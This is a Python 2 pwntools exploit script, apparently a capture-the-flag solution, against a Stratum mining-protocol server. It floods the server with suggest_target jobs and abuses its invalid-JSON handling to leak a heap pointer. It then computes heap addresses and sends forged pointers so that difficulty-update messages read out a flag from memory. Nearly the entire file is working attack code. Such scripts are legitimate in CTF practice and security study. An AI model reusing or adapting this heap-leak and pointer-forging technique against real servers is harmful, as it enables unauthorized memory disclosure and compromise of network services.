#!/usr/bin/env python2

from pwn import *
import sys, json

from stratum import Stratum

TIMES = 10

def main():

    host = sys.argv[1]
    port = int(sys.argv[2])

    conn = remote(host, port)

    s = Stratum(conn)
    s.login()

    def hook(stratum, o):
        # filter the invalid json object
        raw = o.pop('raw')
        d = raw.split("'")[1]
        # bless it's correct!
        dd = d.encode('hex')
        for k, v in json.loads(raw.replace(d, dd)).iteritems():
            o[k] = v
        o['leak'] = dd

    s.handlers = {
            'invalid_json': hook
            }

    # job spray
    one_job = json.dumps({
        'method': 'mining.suggest_target',
        'params': ['1' + '0' * 0x3f],
        }).replace(' ', '')
    s.tube.send(one_job * 383)

    # leak
    o = s.request_sync({'x':'y'})
    if o.get('leak') is None:
        log.warn('failed: %r', o)
        sys.exit(1)

    heap_ptr = u64(o.get('leak').decode('hex').ljust(8, '\x00'))
    log.info('leaked heap ptr = %#x', heap_ptr)
    heap_base = heap_ptr - heap_ptr % 0x1000000
    log.info('heap base = %#x', heap_base)
    client_buf = heap_base + 0xbf0
    flag_addr = heap_base + 0x1dd0

    s.flag = ''

    def difficulty_update(stratum, o):
        print o
        stratum.flag += o.get('params')[0][:16]

    s.handlers['mining.set_difficulty'] = difficulty_update

    payload = '\n'
    attachment = ''
    attach_offset = 0x720
    for i in xrange(0, 48, 16):
        cur = client_buf + attach_offset + i / 0x10 * 0x18
        log.debug('packing %#x', cur)
        payload += json.dumps({
            'method': 'mining.suggest_target',
            'params': p64(cur),
            })
        attachment += ''.join(map(p64, [cur + 0x10, 0, flag_addr + i]))
    payload = payload.ljust(attach_offset, '\x00') + attachment
    s.tube.send(payload[1:])
    # s.tube.interactive()

    time.sleep(3)
    if len(s.flag) == 48:
        print 'FLAG:', s.flag
        sys.exit(0)


if __name__ == '__main__':
    for _ in xrange(TIMES):
        try:
            main()
        except UnicodeDecodeError as e:
            log.warn('bad unicode')
        except Exception as e:
            log.warn('ignoring %r', e)
    sys.exit(1)
    

